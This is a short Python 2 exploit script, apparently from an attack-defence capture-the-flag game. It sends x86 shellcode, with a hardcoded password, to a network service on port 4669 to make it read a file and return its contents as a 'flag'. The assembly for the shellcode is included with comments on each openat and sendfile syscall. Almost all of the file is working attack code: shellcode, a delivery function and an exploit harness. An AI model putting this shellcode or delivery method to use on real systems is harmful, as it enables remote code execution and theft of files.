#!/usr/bin/env python


simple_exploit_code = b'\xE8\x00\x00\x00\x00\x5F\xBB\x9C\xFF\xFF\xFF\x8D\x4F\x50\x31\xD2\xB8\x27\x01\x00\x00\x65\xFF\x15\x10\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xC1\x31\xD2\xBE\x10\x00\x00\x00\xB8\xBB\x00\x00\x00\x65\xFF\x15\x10\x00\x00\x00\x89\xCB\xB8\x06\x00\x00\x00\x65\xFF\x15\x10\x00\x00\x00\xBB\x00\x00\x00\x00\xB8\xFC\x00\x00\x00\x65\xFF\x15\x10\x00\x00\x00'
# Happy disassembling :D



# Joke, here is the "source", complete with what the numbers mean :)
'''
    call tg
tg: pop edi

    mov ebx, 0xffffff9c         ; p1 = AT_FDCWD
    lea ecx, [edi + fname-tg]   ; p2 = &fname
    xor edx, edx                ; p3 = O_RDONLY
    mov eax, __NR_openat
    call [gs:0x10]

    mov ebx, 1                  ; p1 = 1
    mov ecx, eax                ; p2 = fd
    xor edx, edx                ; p3 = NULL
    mov esi, 16                 ; p4 = 16
    mov eax, __NR_sendfile
    call [gs:0x10]

    mov ebx, ecx                ; p1 = fd
    mov eax, __NR_close
    call [gs:0x10]

    mov ebx, 0
    mov eax, __NR_exit_group
    call [gs:0x10]

fname: db FILENAME, 0
'''



import random
import socket
import string
import struct
from time import sleep

def sendcode(ip, port, pwd, code):
    pkt = bytearray()
    pkt.append(chr(len(pwd)))
    pkt.extend(pwd)
    pkt.extend(code)
    s = socket.create_connection((ip,port))
    s.sendall(pkt)
    sleep(0.2)
    s.shutdown(socket.SHUT_WR)
    data = s.recv(1024)
    s.close()
    return data

class Exploit():

    def execute(self, ip, port, flag_id):
        flag = ''
        error = 0
        error_msg = ''

        token = 'A43fgd78AClk3'

        try:
            code = bytearray()
            code.extend(simple_exploit_code)
            code.extend(flag_id)
            code.append(0)
            flag = sendcode(ip, port, token, code)
        except Exception as e:
            error = 42
            error_msg = str(e)

        self.flag = flag
        self.error = error
        self.error_msg = error_msg

    def result(self):
        return {'FLAG' : self.flag,
                'ERROR' : self.error,
                'ERROR_MSG' : self.error_msg,
               }

if __name__ == "__main__":
    import sys
    e = Exploit()
    e.execute("127.0.0.1",4669,sys.argv[1])
    print repr(e.result())
